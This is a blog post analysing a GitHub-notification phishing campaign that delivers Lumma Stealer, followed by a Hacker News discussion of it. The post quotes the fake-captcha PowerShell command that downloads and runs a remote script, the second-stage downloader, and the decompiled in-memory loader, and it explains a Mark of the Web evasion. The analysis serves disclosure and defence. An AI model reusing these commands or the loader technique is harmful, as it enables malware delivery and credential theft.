the sender of the email. I have contacted Github security (the real one, not the fake imposter one) and shared these emails with them along with my concerns. The Website If you were to follow through with the link on that email, you'd find yourself on a page that appears to have a captcha on it. Captcha-gated sites are annoyingly common, thanks in part to services like Cloudflare which offers automated challenges based on heuristics. All this to say that users might not find a page immediately demanding they prove that they are human not that out of the ordinary. What is out of the ordinary is how the captcha works. Normally you'd be clicking on a never-ending slideshow of sidewalks or motorcycles as you definitely don't help train AI, but instead this site is asking you to take the very specific step of opening the Windows Run box and pasting in a command. Honestly, if solving captchas were actually this easy, I'd be down for it. Sadly, it's not real - so now let's take a look at the malware. The Malware The site put the following text in my clipboard (link modified for your safety): powershell.exe -w hidden -Command \"iex (iwr '[https://]2x[.]si/DR1.txt').Content\" # \"✅ ''I am not a robot - reCAPTCHA Verification ID: 93752\" We'll consider this stage 1 of 4 of the attack. What this does is start a new Windows PowerShell process with the window hidden and run a command to download a script file and execute it. iex is a built-in alias for Invoke-Expression, and iwr is Invoke-WebRequest. For Linux users out there, this is equal to calling curlbash. A comment is at the end of the file that, due to the Windows run box being limited in window size, effectively hides the first part of the script, so the user only sees this: Between the first email I got and the time of writing, the URL in the script have changed, but the contents remain the same. Moving onto the second stage, the contents of the evaluated script file are (link modified for your safety): $webClient = New-Object System.Net.WebClient $url1 = \"[https://]github-scanner[.]com/l6E.exe\" $filePath1 = \"$env:TEMP\\SysSetup.exe\" $webClient.DownloadFile($url1, $filePath1) Start-Process -FilePath $env:TEMP\\SysSetup.exe This script is refreshingly straightforward, with virtually no obfuscation. It downloads a file l6E.exe, saves it as \\AppData\\Local\\Temp\\SysSetup.exe, and then runs that file. I first took a look at the exe itself in Windows Explorer and noticed that it had a digital signature to it. The certificate used appears to have come from Spotify, but importantly the signature of the malicious binary is not valid - meaning it's likely this is just a spoofed signature that was copied from a legitimately-signed Spotify binary. The presence of this invalid codesigning signature itself is interesting, because it's highlighted two weaknesses with Windows that this malware exploits. I would have assumed that Windows would warn you before it runs an exe with an invalid code signature, especially one downloaded from the internet, but turns out that's not entirely the case. It's important to know how Windows determines if something was downloaded from the internet, and this is done through what is commonly called the \"Mark of the Web\" (or MOTW). In short, this is a small flag set in the metadata of the file that says it came from the internet. Browsers and other software can set this flag, and other software can look for that flag to alter settings to behave differently. A good example is how Office behaves with a file downloaded from the internet. If you were to download that l6E.exe file in your web browser (please don't!) and tried to open it, you'd be greeted with this hilariously aged dialog. Note that at the bottom Windows specifically highlights that this application does not have a valid signature. But this warning never appears for the victim, and it has to do with the mark of the web. Step back for a moment and you'll recall that it's not the browser that is downloading this malicious exe, instead it's PowerShell - or, more specifically, it's the System.Net.WebClient class in .NET Framework. This class has a method, DownloadFile which does exactly that - downloads a file to a local path, except this method does not set the MOTW flag for the downloaded file. Take a look at this side by side comparison of the file downloaded using the same .NET API used by the malware on the left and a browser on the right: This exposes the other weakness in Windows; Windows will only warn you when you try to run an exe with an invalid digital signature if that file has the mark of the web. It is unwise to rely on the mark of the web in any way, as it's trivially easy to remove that flag. Had the .NET library set that flag, the attacker could have easily just removed it before starting the process. Both of these weaknesses have been reported to Microsoft, but for us we should stop getting distracted by code signing certificates and instead move on to looking at what this dang exe actually does. I opened the exe in Ghidra and then realized that I know nothing about assembly or reverse engineering, but I did see mentions of .NET in the output, so I moved to dotPeek to see what I could find. There's two parts of the code that matter, the entrypoint and the PersonalActivation method. The entrypoint hides the console window, calls PersonalActivation twice in a background thread, then marks a region of memory as executable with VirtualProtect and then executes it with CallWindowProcW. private static void Main(string[] args) { Resolver resolver = new Resolver(\"Consulter\", 100); Program.FreeConsole(); double num = (double) Program.UAdhuyichgAUIshuiAuis(); Task.Run((Action) (() => { Program.PersonalActivation(new List(), Program.AIOsncoiuuA, Program.Alco); Program.PersonalActivation(new List(), MoveAngles.userBuffer, MoveAngles.key); })); Thread.Sleep(1000); uint ASxcgtjy = 0; Program.VirtualProtect(ref Program.AIOsncoiuuA[0], Program.AIOsncoiuuA.Length, 64U, ref ASxcgtjy); int index = 392; Program.CallWindowProcW(ref Program.AIOsncoiuuA[index], MoveAngles.userBuffer, 0, 0, 0); } The PersonalActivation function takes in a list and two byte arrays. The list parameter is not used, and the first byte array is a data buffer and the second is labeled as key - this, plus the amount of math they're doing, gives it away that is is some form of decryptor, though I'm not good enough at math to figure out what algorithm it is. I commented out the two calls to VirtualProtect and CallWindowProcW and compiled the rest of the code and ran it in a debugger, so that I could examine the contents of the two decrypted buffers. The first buffer contains a call to CreateProcess 00000000 55 05 00 00 37 13 00 00 00 00 00 00 75 73 65 72 U...7.......user 00000010 33 32 2E 64 6C 6C 00 43 72 65 61 74 65 50 72 6F 32.dll.CreatePro 00000020 63 65 73 73 41 00 56 69 72 74 75 61 6C 41 6C 6C cessA.VirtualAll 00000030 6F 63 00 47 65 74 54 68 72 65 61 64 43 6F 6E 74 oc.GetThreadCont 00000040 65 78 74 00 52 65 61 64 50 72 6F 63 65 73 73 4D ext.ReadProcessM 00000050 65 6D 6F 72 79 00 56 69 72 74 75 61 6C 41 6C 6C emory.VirtualAll 00000060 6F 63 45 78 00 57 72 69 74 65 50 72 6F 63 65 73 ocEx.WriteProces 00000070 73 4D 65 6D 6F 72 79 00 53 65 74 54 68 72 65 61 sMemory.SetThrea 00000080 64 43 6F 6E 74 65 78 74 00 52 65 73 75 6D 65 54 dContext.ResumeT 00000090 68 72 65 61 64 00 39 05 00 00 BC 04 00 00 00 00 hread.9...¼..... 000000A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0 00 00 00 00 00 00 43 3A 5C 57 69 6E 64 6F 77 73 ......C:\\Windows 000000C0 5C 4D 69 63 72 6F 73 6F 66 74 2E 4E 45 54 5C 46 \\Microsoft.NET\\F 000000D0 72 61 6D 65 77 6F 72 6B 5C 76 34 2E 30 2E 33 30 ramework\\v4.0.30 000000E0 33 31 39 5C 52 65 67 41 73 6D 2E 65 78 65 00 37 319\\RegAsm.exe.7 [...] And the second buffer, well, just take a look at the headers you might just see what's going on :) 00000000 4D 5A 78 00 01 00 00 00 04 00 00 00 00 00 00 00 MZx............. 00000010 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030 00 00 00 00 00 00 00 00 00 00 00 00 78 00 00 00 ............x... 00000040 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 ..º..´.Í!¸.LÍ!Th 00000050 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F is program canno 00000060 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 t be run in DOS 00000070 6D 6F 64 65 2E 24 00 00 50 45 00 00 4C 01 04 00 mode.$..PE..L... So now we know that the large byte arrays at the top of the code are an \"encrypted\" exe that this loader puts into memory, marks it as executable, and then executes it. Marvelous. Sadly, this is where I hit a wall as my skills at reverse engineering applications are very limited. The final stage of the attack is a Windows exe, but not one made with .NET, and I don't really know what I'm looking at in the output from Ghidra. Thankfully, however, actual professionals have already done the work for me! Naturally, I put both the first and second binaries into VirusTotal and found that they were already flagged by a number of AVs. A common pattern in the naming was \"LUMMASTEALER\", which gives us our hint as to what this malware is. Lumma is one of many malware operations (read: gangs) that offer a \"malware as a service\" product. Their so-called \"stealer\" code searches through your system for cryptocurrency wallets, stored credentials, and other sensitive data. This data is then sent to their command-and-control (C2) servers where the gang can then move on to either stealing money from you, or profit from selling your data online. Lumma's malware tends to not encrypt victims devices such as traditional ransomware operations do. For more information I recommend this excellent write-up from Cyfirma. If you made it this far, thanks for reading! I had a lot of fun looking into the details of this attack, ranging from the weakness in Github's notification emails to the multiple layers of the attack. Some of the tools I used to help me do this analysis were: Windows Sandbox Ghidra dotPeek HxD Visual Studio Updates: Previously I said that the codesigning certificate was stolen from Spotify, however after discussing my findings with DigiCert we agreed that this is not the case and rather that the signature is being spoofed.",
    "commentLink": "https://news.ycombinator.com/item?id=41596466",
    "commentBody": "GitHub notification emails used to send malware (ianspence.com)424 points by crtasm 21 hours agohidepastfavorite169 comments theamk 20 hours agoDo people really fall for scam like that? First, I assume the author knows the email came from github, as the screenshot does not show this very clearly. If that's the case: Red flag #1: email links to a variation of real domain. If you don't have information on who github-scanner.com is, it is pretty safe to assume it's a scam , just because it sounds like a real website. GIANT Enormous Huge Red Flag #2: captcha asks you to types command in shell. I have no comment on how naive one must be to do this. reply thephyber 19 hours agoparentIt’s a numbers game. Nobody is perfect. The more features of credibility, most likely there will be a higher percentage of conversions. But not everybody has excellent vision, is not time-pressured, and is not tired/exhausted. There are lots of conditions that make otherwise difficult fraud targets more easy to trick. And if it can be done at large scale / automated, then small conversion rates turn into many successful frauds (compromised accounts). reply acomjean 7 hours agorootparentI think they’re hoping for coincidences and the higher the numbers the more likely they’ll find one. I got a real letter from the IRS two days before I got the scam message on my answering machine. The timing was uncanny and I might easily have fallen for it, had I not already dealt with it. It’s the same for the Chinese language calls, if you speak Chinese it really resonates. There was a scam in the 90s where you’d call a number and they’d give you sports betting advice. They’d do it for free as a promotion trying to sell their service when you won. They’d tell half the callers bet team A and the other half team B. The numbers made it work. “Splitting games 50-50 like that—known in the biz as \"double-siding\"—is the oldest trick in the handicapper's very thick book. That way he knows he has at least some happy customers coming back. “ https://vault.si.com/vault/1991/11/18/1-900-ripoffs-the-ads-... reply generic_dev_47 12 hours agorootparentprevAgree, I once fell for a scam that I think I otherwise wouldn't because of string of circumstances: Being tired and stressed, it being Christmas time and I had actually ordered stuff but also because I had just upgraded iOS to the first version that put the address bar in Safari on the bottom of the screen instead of the top so I forgot to check the domain! I've since changed the address bar back to the top… In the end I didn't loose anything but it was a good wakeup call for sure. reply szundi 13 hours agorootparentprevThanks for this summary. People often forget they (hopefully) have grandmas and themselves sometimes making mistakes as well for -- whoever knows what reason. Sometimes. reply thih9 12 hours agoparentprevIf this was within my first year of owning a GitHub account, I would absolutely fall for this. It's not much different from setting up your ssh key - something that you have to do; and new users also go through this workflow by copy pasting commands that GitHub sends them. reply jampekka 7 hours agorootparentA prime example how all the paranoid security hoops can easily make things more insecure in aggegate. Since Microsoft embracing and extending it, GitHub has become one of the worst offenders. reply me-vs-cat 20 minutes agoparentprev> Do people really fall for scam like that? You should put a \"voice activated\" sticker on a random break room appliance (toaster, water/ice dispenser, microwave, coffee machine, ...). Don't use strong adhesive if your desk is within hearing distance. reply latexr 18 hours agoparentprevA few weeks ago someone opened an issue in one of my repos. In under a minute two accounts replied with links to file lockers asking the user to download and try some software to solve their issue. No doubt it was malware. I promptly deleted the comments and reported the accounts to GitHub. I wouldn’t have fallen for such an obvious ploy, but the original asker seemed like they weren’t particularly technical, judging by the sparse GitHub history and quality of the question. I could see them perhaps falling for that if they were uncritical and too eager to try anything. reply ceejayoz 19 hours agoparentprevEmail from a different domain is unfortunately quite common. Citi and PayPal both do it for some emails. Pisses me off every time. reply szundi 13 hours agorootparentI just don't get it, how hard it could be? How expensive this could be? Because lots of times they just pay these damages to the customer, because no one knows how this very secure credit card data was compromised. This baffles me. Someone, please enlighten us, there must be a valid reason - at least from an angle. reply sofixa 11 hours agorootparentHaving a bunch of different domains can serve multiple purposes. In GitHub's case, they already have githubusercontent.com to avoid serving untrusted stuff from their own github.com domain. Sending marketing or security scanner (potentially very spammy) notification emails from separate domains can help with reputation too, to avoid your main domain getting marked as spam. These are all legit; Amex having 20 different of domains, half of which smell like phishing, and still sending emails from other domains is just incompetence. Something like marketing people or someone dealing with strategy deciding to do stuff in a certain way, with nobody technical in the room to tell them why that would be a problem. As an example, a friend of mine's organisation wanted to do a SaaS website for their niche, and a separate website to advertise the SaaS (separate domain, visual identity, everything). reply progval 6 hours agorootparentMy theory for most of these cases: they would need permission from who knows what department(s) to set up a subdomain of the main domain for their project, and it's easier to just purchase a new domain for the team/project. reply m3047 2 hours agorootparentprevKeep your SPF simple. Otherwise, make sure it works. Aaand, how many people actively monitor their DNS infrastructure? reply obscurette 11 hours agoparentprevI'm old enough to remember ILOVEYOU. During years after that I have seen millions and millions thrown into educating users not to click on wrong things. Last month I was in conference where the keynote was from CEO of cyber security company. The whole point of the speech was that we need more money because in some cases more than 80% users still fall into email scams. My very serious question to the speaker was - if after many millions and almost 25 years more than 80% users still click on wrong links, then maybe we do something really wrong? reply bugtodiffer 11 hours agorootparentWe are, but people want convenience. Try to get a company built around Word to use another tech that doesn't requires running unsigned macros from emails... You literally can't, they lough at you for saying things like \"don't use Microsoft\" reply guappa 9 hours agorootparentprevThey measure by clicks… but clicking a link doesn't mean you'll follow through and put in your username, password, and 2fa code. Ultimately he's a businessman seeking for more money. Doesn't mean he can be trusted. reply kayodelycaon 7 hours agorootparentIn my opinion, these products are nothing but scams. I can’t use any links from work emails on my phone because I can’t see the domain of a link without previewing the page. IT told me I needed to change system-wide settings to disable previewing webpages in every app on my phone. Not happening. Fortunately, my work email supports IMAP, so I can use a script to scan my inbox for fake phishing emails and delete them. reply mnau 11 hours agorootparentprevWe are not not doing anything wrong, but we are completely neglecting the attacker side. All our actions are defensive. Look at our physical security. Basically nothing is reasonably protected. 99% of stuff (buildings, locks) can be broken into with tools available in any home depot. The key reason why it doesn't happen that much is because it's possible to find the attacker. Why can any scammed just create a website without any traceability? It wouldn't be foolproof, but it would raise a bar. reply chii 10 hours agorootparent> Why can any scammed just create a website without any traceability? because jurisdictional challenges. Not to mention that this very same traceability would be abused by some other authoritarian gov't to track down dissidents for example. There's no real way to systematically have good security, if the human element is the weakest link tbh. Securing windows is not a technical problem, but a social and educational one. reply mnau 10 hours agorootparentMore like no will. Does the domain/server implements required level? No? Block connection. Dtto email with automatic response. Is your IP in a botnet? Cut it off. Edit: I already get blocked connection (on target site) because EU regulation is too onerous. I get reminded on basically every Google search I am being censored (Some results may have been removed under data protection law in Europe). Completely doable. reply GTP 9 hours agorootparent> I already get blocked connection (on target site) because EU regulation is too onerous More like \"we want to track every single user coming to our website without giving them the option to not be tracked\". reply mnau 9 hours agorootparentYou can serve consent form only to the connections from EU. I have been part of se several GDPR compliance projects and it's the other stuff that's the problem. Data protection officer (recurring cost, even though it is only a part of a job, not full time position) , user data deletion and user data take-out. Compliance is not free. If system wasn't designed from the beginning, it's really expensive to add it. Restore from backup after disaster recovery - make sure you anonymize/delete people who were deleted after backup was made. BTW, IP address is PII, so... Honestly, it would be cheaper to buy everyone in EU VPN. reply GTP 6 hours agorootparent> You can serve consent form only to the connections from EU. Why? While I get that, if tracking is part of someone's business model, they want to track as many people as possible, I doubt it would be illegal to give also people that aren't in the EU the option to not be tracked. If it really would be so expensive to be compliant while also differentiating between users connecting from the EU and users connecting from outside the EU, why not just give everyone the option to choose if they want tracking as a measure to cut compliance cost? reply janc_ 7 hours agorootparentprevIt's actually very simple & cheap to be compliant: stop tracking EU citizens. reply guappa 9 hours agorootparentprevWhat do you suggest? Bomb even more countries? reply mnau 9 hours agorootparentYou don't need to bomb anyone. Add IP rules at cables inside and out of let's say EU and block it there. Same way we deal with any non-compliance thing. You can't import it. Your server/domain doesn't satisfy requirments. Either the originator complies or not (e.g. through trusted third party). reply guappa 9 hours agorootparentBecause ip geolocation has always been reliable and never inaccurate? reply mnau 8 hours agorootparentNo geolocation is needed. And even if it was, these are technical problems, inherently solve able. So far, we are building walls and replacing mortar with a new one, while attackers bombard us with complete impunity. This is never going to work. This would of course need new extensions /protocols (even simplest would require authentication envelope around encrypted traffic). reply guappa 8 hours agorootparentThe problem is that you think a societal problem can be solved technically. reply mnau 7 hours agorootparentThe whole point is to move from technical solution (i.e. current approach) to legal one. Not a single response had anything to do with either problem ITA or my comment. I am not sure if you are troll, 10 y/o or gpt1, but have a nice day. reply prmoustache 7 hours agoparentprev> GIANT Enormous Huge Red Flag #2: captcha asks you to types command in shell. I have no comment on how naive one must be to do this. I guess critical thinking of devs and wannabee devs has been softened by all the `curlbash` installation instructions. reply d3nj4l 7 hours agorootparentYeah exactly, I do that all the time when filling captcha! reply maicro 5 hours agoparentprevAll valid points, but I will say services don't help in this situation - I received an email from @redditmail.com recently, which is real and part of reddit but feels off on first glance. Couple that with gmail having no way to show the full email address (by default - I know you can hover, etc.), rather than the sender-provided \"sender name\", and my false-positive rate for at least double checking and confirming the sending domain is kinda high...better that than a bunch of false-negatives of course. reply edelbitter 11 hours agoparentprevThey do. Just after seeing instructions to run this, and complying: > curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rssh (Yup, .rs is the ccTLD for the Republic of Serbia, of former SFR Yugoslavia) reply mewpmewp2 19 hours agoparentprevI can understand clicking on the link while not paying attention, but I do wonder how many people who are signed up on GitHub would follow through with pasting this command. I could understand if elderly non technical people might follow up with it, but this one, I wonder what the rate is. reply hmottestad 12 hours agorootparentJust clicking on the link might be enough. Maybe you have a slightly outdated browser with a known vulnerability. Maybe you’re holding off on installing an update just to be sure it won’t break anything. And even if everything is up to date Pwn2Own regularly shows that having a user browse to a website is enough to get root access. Thankfully most people don’t have to worry about this since they are unlikely to attract the attention of someone with that level of resources. reply hmottestad 12 hours agorootparentIf I had those kinds of resources I might even put a captcha on the site that asks the user to do something incredibly stupid just to make them think they were in the clear. reply mewpmewp2 7 hours agorootparentprevYeah, I think the barrier to get people to just click on a link (outside of e-mail as well) is very low, so that would be easy to affect anyone. reply eviks 14 hours agoparentprev> Red flag #1: email links to a variation of real domain It's too common, MS also does this, to be a red flag reply Dibby053 6 hours agoparentprev>GIANT Enormous Huge Red Flag #2: captcha asks you to types command in shell. I have no comment on how naive one must be to do this. Funnily enough there's at least one legit captcha that has you do this: if you have JavaScript/WASM disabled it gives you the option of running the anti-DDOS proof-of-work in a shell and pasting the result in a textbox. reply voytec 4 hours agoparentprev> Do people really fall for scam like that? Yes. It wouldn't be a thing otherwise. I know at least two fairly intelligent people, one literally being a Mensa member, who fell for sextortion emails and got their files encrypted. Scareware is based on social engineering, and is crafted to trigger emotional response, not educated one. reply Stratoscope 9 hours agoparentprevRed flag #3: \"Github Security Team\" A legitimate GitHub email would never mis-capitalize the company name like that. It would be GitHub, as shown in the footer that the attacker does not control. OTOH, this is a very common mistake. The article alternates between the correct GitHub and the incorrect Github. So it would be easy to not notice that error. reply chii 10 hours agoparentprev> captcha asks you to types command in shell. I have no comment on how naive one must be to do this. someone who knows computers (like a programmer) might not fall for it, but people who do not know computers, but is dabbling could easily fall for it. The copied command specifically puts in a \"user friendly captcha message\" into the end, to overflow the run dialog textbox, so that a user who obeyed the instructions will see something vaguely resembling valid captcha verification: # \" ''I am not a robot - reCAPTCHA Verification ID: 93752\" Phishing and scams are not about catching out pros, but catching out \"normies\". It's quite scary that the scammers have put thought and effort into the method of infiltration, because this is \"novel\" as far as i have heard. reply godelski 8 hours agoparentprev> Do people really fall for scam like that? I routinely get people opening issues on my projects asking where the source code is or how to fine tune their models on different data or even how to install pytorch.... There's a lot of people on GitHub that don't know the first thing about coding. There's a lot of people on GitHub that don't know how to use Google... This even includes people with PhDs... reply NeveHanter 8 hours agorootparentI've also seen an issue on GitHub asking project author to add an entry in README.md with instructions on how to clone the repository... reply tom_ 7 hours agorootparentActually worth doing if the repo uses submodules. reply godelski 1 hour agorootparenthttps://lmgtfy.click/?q=How%20do%20I%20clone%20a%20repositor... reply keybored 2 minutes agorootparentThe naive way in this case wouldn’t be to make an issue: How do I clone this repo? I see it has submodules The naive way would be to just clone the repo without any (apparently) options. I can attest to this because that’s probably what I would do. The readme would not resolve a problem that someone knowingly had. It would resolve an unknown upcoming problem. zahlman 15 hours agoparentprevNot only does it ask you to copy and paste a command in shell, but Windows apparently warns you that it will run with admin privileges. Aside from that: > Nowhere in the email does it say that this is a new issue that has been created, which gives the attacker all the power to establish whatever context they want for this message. What about the non-user-controlled \"(Issue #1)\" in the subject line? reply antimemetics 9 hours agoparentprevYou assume the scammers want everyone to fall for this trick. The reality is different - they leave these huge red flags so that people who aren’t very bright or careful will fall for it. That is the same reason why scammers put spelling mistakes in emails - not because they don’t know how to use spellcheck, but because they want to filter out those who would spot these mistakes. They want to scam careless, gullible, „stupid“ people, not someone who is careful enough to spot security red flags. reply sureglymop 12 hours agoparentprevJust to let you know, even github themselves use multiple domains instead of just subdomains of github.com (see githubnext.com). So, I wouldn't blame the victims here if the service itself does not realize why that is not such a good idea. reply 8n4vidtmkvmk 12 hours agorootparentYeah.. I don't like when companies do that. I usually Google the domain first to see if it's legit, but even that isn't foolproof. reply lgats 18 hours agoparentprevre #1: the email could link to a github pages site hosting the same malware... re #2: it doesn't really have you typing into shell, 'just paste' reply mixtureoftakes 19 hours agoparentprevHonestly i would have typed commands in shell if \"captcha\" asked me for it. Just to see the scale of outcome's awfulness. I'm almost bored enough to just start installing weird malware for research and funsies reply fijiaarone 19 hours agoparentprevEveryone has been trained for years to do this: curl http://obscure.url?random-stringsh reply umanwizard 18 hours agorootparentNo they haven’t, they’ve been trained to do curl https://url-of-well-known-projectsh I may not trust the owners of a random domain, but I certainly trust the owners of rustup.rs not to do anything intentionally malicious. reply account42 4 hours agorootparentThen you are more trusting of the Serbian National Internet Domain Registry than you should be. reply guappa 10 hours agorootparentprevMicrosoft owns more domain names than the amount of neurons in the brain. reply dullcrisp 19 hours agorootparentprevIf there were a legitimate looking GitHub how-to page that asked me to do that, I can see myself doing it. Fortunately, I ignore all security issues on my repositories. reply ToValueFunfetti 15 hours agorootparentSecurity by lack thereof reply kurisufag 19 hours agorootparentprevpeople make a lot of noise about piping into shell, but even if the instructions were wget random.club/rc-12-release.sh chmod +x ./rc-12-release.sh ./rc-12-release.sh almost nobody would actually read the script before running it reply dullcrisp 18 hours agorootparentWell yeah, if your intention is to install software from random.club on your system, what would be the point of checking the installer script? The worst thing it can do is the same thing you want it to do. reply umanwizard 18 hours agorootparentYes, which is why complaining about curlsh is silly. reply dullcrisp 18 hours agorootparentI’m not disagreeing. reply fijiaarone 19 hours agorootparentprevor even this: git clone http://github.com/unknown/repo.git && cd repo && npm install reply darkwater 13 hours agorootparentEven worse: $ svn checkout $ ./configure $ make # make install reply micw 14 hours agorootparentprevAnother red flag. I cannot take any project serious that has this on its documentation. reply kadoban 13 hours agorootparentYou prefer that they wrap it in an .msi file and put it on that same website? What do you think the advantages of that are? reply umanwizard 13 hours agorootparentprevI guess you don’t think the Rust programming language is a serious project, then? reply guappa 10 hours agorootparentI mean they even named the website cargo, after cargo culting! (jk) reply d0mine 13 hours agorootparentprevwhat is the more secure way in you opinion? What is the weak link here? TLS transport? possibly compromised hosting/codebase? trust in app authors? not reading the shell script? checking a signature of some file? reply veltas 12 hours agoprevI got a much more convincing email from PayPal recently, someone sent a quote (apparently a feature that can be used unsolicited), and set their company name to something like \"PayPal need to get in touch about a your recent payment of $499.00, please call +1-....\", so this is most of the text at the top because their quotes email is \" is sending you a quote for $xxx\". This email came from the real PayPal.com, how they haven't gotten on top of usernames like that is beyond me for a payment processor. I reported it to them but haven't heard anything back, hopefully they banned that account but they should ban all names like that. This email honestly was formatted to look like a legit PayPal email, I have to imagine that scam will trick a lot of normal people. Get in touch, see my bio website, if you want the email. reply dyingkneepad 1 hour agoparentI got a very similar thing: a legit email from PayPal, but it's an invoice and not a quote. And when you login to PayPal the website shows nothing. reply davidd_1004 11 hours agoparentprevHad this happen to me over a year ago so I assume reporting it to them did nothing :) reply reportgunner 9 hours agoparentprevWhy would paypal email you to call them ? If they want something from you they should either call you or email it to you or show it in their portal. reply veltas 6 hours agorootparentI don't know, most PayPal customers wouldn't know either. And the point is that these emails are designed to look legit and also scare you into taking action without thinking about it too hard. And this particular email bypasses a lot of the rules in general consciousness about phishing like \"check for spelling mistakes, check the sender email, does it look official, does it mention you by name\", all of those boxes are ticked. This is only possible because PayPal clearly aren't actively fighting against these kinds of attacks. reply guappa 12 hours agoparentprevI'd be surprised if someone looked at it. reply akimbostrawman 12 hours agoparentprev>This email honestly was formatted to look like a legit PayPal email, this is why anything but plain text should be blocked in emails (besides security reasons). anybody with 5 minutes of HTML experience can create \"legit looking\" emails. reply sofixa 11 hours agorootparentIt was an actual email sent by PayPal via a service they propose (sending invoices), just with a smartly crafted company name that made it look it's from them. No HTML was required from the attacker. reply veltas 10 hours agorootparentprevLegit looking because it was formatted by PayPal themselves, and also sent from PayPal.com. reply keyle 19 hours agoprevPress Win+R, CTRL+VFrom captcha to gotcha. I could see junior developers falling for this. Hey it's Github, it's legit right? We get security notifications every second months about some lib everyone uses etc. \"Oh look, captcha by running code, how neat!\" I don't think webpages should be able to fill your copy/paste buffer from a click without a content preview. They made it requiring a user action, such as clicking, thinking that would solve the problem but it's still too weak. That's problem number 1. People need to stop actioning any links from emails and/or believing that any content in an email has legitimacy. It doesn't. That's problem number 2. Problem number 3, Windows still let you root a machine by 1 line in powershell? What the @$$%&%&#$? Github might need to stop people putting links in issues without being checked by automated services that can validate the content as remotely legitimate. They're sending this stuff to people's email, don't tell me they're not aware this could be used for fishing! That's cyber security 101, in 2015. Finally, Github, in being unable to act on the above, may need to better strip what they email to people, and essentially behave more like banks \"you have a new issue in this repository...\" and that's that. You then go there, there is no message, ok great. That would have taken care of this issue... It seems Github needs to graduate a bit here. reply gerdesj 18 hours agoparent\"I could see junior developers falling for this\" - I can see all sorts fucking up, not just juniors. It is the way of things. \"I don't think that...\". I think that you have to train your troops effectively in what is harmfull. \"Windows\" - yes. I have been asked by at least two of my employees to get them away from Windows. I'll do my best. Its been a long running project but I will succeed. reply rpigab 3 hours agoparentprevThis captcha is so bad... I'm gonna automate the solving of this captcha so whenever my browser shows me \"Press Win+R, CTRL+V \", it automatically runs cmd.exe with the clipboard content so I can get to the site content faster and with no interruption. Yes, I'm a 10X Windows user. reply ocdtrekkie 18 hours agoparentprevI've started disabling the Run dialog for non-technical users, but unfortunately a GitHub attack targets users who likely have a real use for it sometimes. The clipboard strategy feels like it should be easy to block too, most scammers just convince people to type a well-obscured URL into the Run dialog manually over the phone. reply chii 10 hours agorootparent> The clipboard strategy feels like it should be easy to block too yea, the browser should actually have each site ask for permission to modify the clipboard imho. reply bradjohnson 5 hours agorootparentThat might add another step but I think it is unlikely to help reduce the number of victims. If someone is willing to bring up the run prompt and paste whatever they have in the clipboard they are also likely to be social engineered into clicking yes on a dialog that tells them to allow clipboard modification. reply justsomehnguy 18 hours agoparentprev> Problem number 3, Windows still let you root a machine by 1 line in powershell? What the @$$%&%&#$? sigh It needs to be run under an account with admin privileges for that. The shield on the \"Run\" dialog screenshot clearly indicates what it was taken under a user with admin privileges and UAC disabled. Come on, now cry what Linux still let you root a machine by 1 line in curl malware.zyx/evilscriptbash. reply koolba 18 hours agorootparent> … by 1 like in curl malware.zyx/evilscriptbash. Making the script POSIX compliant would allow hacking computers without bash. Then you can pipe it into just “sh” which is guaranteed to be on the PATH. reply chii 10 hours agorootparentprev> it was taken under a user with admin privileges and UAC disabled. you will have to accept that users either ask this UAC to be turned off, or it gets turned off by the original installer of the windows for the user (presumably non-technical user). It's like telling traffic accident sufferers that they should've put on a seatbelt. True, but pointless. reply rl3 18 hours agorootparentprev>Come on, now cry what Linux still let you root a machine by 1 line in curl malware.zyx/evilscriptbash. Excuse me, but some of us prefer to let evil scripts root our machines via pure sh, thank you very much. reply koolba 18 hours agorootparentGlad I’m not the only one thinking about POSIX compliance! reply Dalewyn 18 hours agoparentprev>Windows still let you root a machine by 1 line in powershell? What the @$$%&%&#$? You say it's a problem, I say it is a virtue. We can \"root\" Windows because we are root, specifically a user in the Administrators group because the first user account configured by Windows Setup is always an administrator account. This is a virtue. We can do whatever we want with the computer we own and use. This is freedom par excellence that literally every other operating system family today wishes they could do without getting shouted down. In an era of increasingly locked down operating systems that prevent us from truly owning our computers, administering them, Windows just lets us do that. I hope to god this never changes. reply AdieuToLogic 17 hours agorootparent>>Windows still let you root a machine by 1 line in powershell? What the @$$%&%&#$? > We can do whatever we want with the computer we own and use. There is a difference between what an owner of a computer can and should be able to do, verses what an arbitrary actor can do to a computer they do not own through subterfuge. It is the responsibility of an Operating System to facilitate the former and guard against the latter. MS Windows has a poor history of being able to do either. reply Dalewyn 17 hours agorootparentRemember the old saying: With great power comes great responsibility. Windows just lets us do anything and everything, and it's up to us how we want to secure it if at all. Every other operating system family tries to realize security by straight up locking the user, the administrator, out of his own computer. They still get compromised, by the way. Windows has absolutely succeeded and continues to succeed in enabling the user, including security if he so desires. This is the reason Windows became the dominant desktop OS. The others? Nope on both counts. The Linux world in particular always screams about user freedom, yet ironically it's Windows and its community that actually makes that freedom a reality. Once more: I hope to god this never changes. reply nativeit 16 hours agorootparentThis is a wild take. Would you mind expanding a bit on the oppressive, locked down ecosystem that’s choking the free expression of Linux users? reply Dalewyn 16 hours agorootparentFor starters it's security theater, given everyone and their dog prefixes sudo to all commands without much thinking. There are also some who just smash in sudo -i as the first thing they ever do upon boot (guilty as charged) because they suffer RSI from typing sudo a trillion times. There's also this impression that the operating system is just secure and you as the user are just protected like it's a law of physics. Spoiler alert, you are not and it's not a law of physics either. It's still your responsibility to secure the computer if you so desire and otherwise not do dumb shit like copypasta'ing commands from the internet. I'm not even going to get into the politics that are package managers and repos, that's just straight bullshit that has more to do with human nature than computer science. Speaking of politics, most of the FOSS community at large hates users using and administrators administering computers how they want. You must subscribe to the One Libre Way(tm) or you are a heathen doing it wrong. So much for freedom. The Windows community meanwhile is mostly composed of jaded engineers who are just happy to see others get stuff done and get through another day in one piece. Windows from the start places the user at the controls with mostly no child safety locks in place (and you can remove what is there easily, eg: UAC), and with that power you have to accept that if you end up hosing the system the problem is you because Windows doesn't even pretend to really protect you. Having the sheer power to hose Windows with a single Powershell line is what freedom is. Freedom is both delightful and horrifying. reply kbolino 3 hours agorootparent> Windows from the start places the user at the controls Would this be the same Windows that now requires TPM2, UEFI Secure Boot, a Microsoft account to log in, and a special boot mode 